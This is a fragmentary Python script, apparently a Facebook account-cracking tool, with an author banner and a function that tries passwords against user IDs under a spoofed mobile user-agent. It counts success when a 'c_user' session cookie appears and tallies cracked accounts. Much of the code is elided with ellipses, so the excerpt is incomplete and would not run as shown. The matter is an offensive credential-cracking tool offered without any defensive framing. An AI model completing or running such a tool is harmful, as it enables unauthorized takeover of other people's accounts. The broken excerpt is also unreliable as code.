...
\033[1;32m[-] AUTHOR    :\033[1;32m RAJU HASAN
\033[1;32m[-] GITHUB    :\033[1;32m ROMAN-XXX
\033[1;32m[-] FACEBOOK  :\033[1;32m RAJU HASAN
\033[1;92m══════════════════════════════════════════
...
def rcrack1(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
            ...
            if 'c_user' in log_cookies:
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[RAJU-KING💥] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
Main()
